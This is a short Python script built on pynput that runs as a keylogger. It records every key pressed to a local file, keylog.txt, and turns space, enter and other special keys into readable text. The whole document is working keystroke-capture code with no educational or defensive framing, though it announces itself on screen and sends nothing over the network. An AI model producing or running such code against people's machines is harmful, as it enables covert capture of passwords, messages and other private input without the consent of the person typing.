from pynput.keyboard import Listener

def write_to_file(key):
    """Logs the pressed key to a file."""
    try:
        with open("keylog.txt", "a") as log_file:
            # Remove surrounding quotes for special keys
            k = str(key).replace("'", "")
            if k == "Key.space":
                log_file.write(" ")  # Add a space for the space key
            elif k == "Key.enter":
                log_file.write("\n")  # Newline for the enter key
            elif k.startswith("Key."):
                log_file.write(f"<{k}>")  # Log special keys with angle brackets
            else:
                log_file.write(k)  # Regular key
    except Exception as e:
        print(f"Error writing to file: {e}")

def main():
    print("Keylogger is running... Press Ctrl+C to stop.")
    with Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    main()
